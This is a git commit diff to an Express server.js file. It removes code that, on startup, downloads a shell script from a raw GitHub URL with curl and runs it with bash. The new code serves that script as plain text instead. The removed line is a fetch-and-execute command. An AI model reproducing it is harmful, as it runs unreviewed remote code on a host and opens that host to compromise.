3eddfac5dedbf54e23edfc973d80895786da12b1
Pushkar9312Repo <pushkarmudganti@gmail.com>
2026-03-22 12:46:19 +0530

    Update server.js

--- server.js
+++ server.js
@@ -1,17 +1,19 @@
-const { exec } = require("child_process");
 const express = require("express");
+const https = require("https");
 
 const app = express();
 
-// safer: download then run
-exec("curl -fsSL https://raw.githubusercontent.com/DeVv-Prime/codingprime/main/ptero/run.sh -o run.sh && bash run.sh", (err, stdout, stderr) => {
-  console.log("OUTPUT:", stdout);
-  console.error("ERROR:", stderr);
-});
-
 app.get("/", (req, res) => {
-  res.send("Server is running 24/7 🚀");
+  https.get("https://raw.githubusercontent.com/DeVv-Prime/codingprime/main/ptero/run.sh", (resp) => {
+    let data = "";
+
+    resp.on("data", chunk => data += chunk);
+    resp.on("end", () => {
+      res.set("Content-Type", "text/plain");
+      res.send(data);
+    });
+  });
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Running on ${PORT}`));
+app.listen(PORT, () => console.log(`Server running on ${PORT}`));
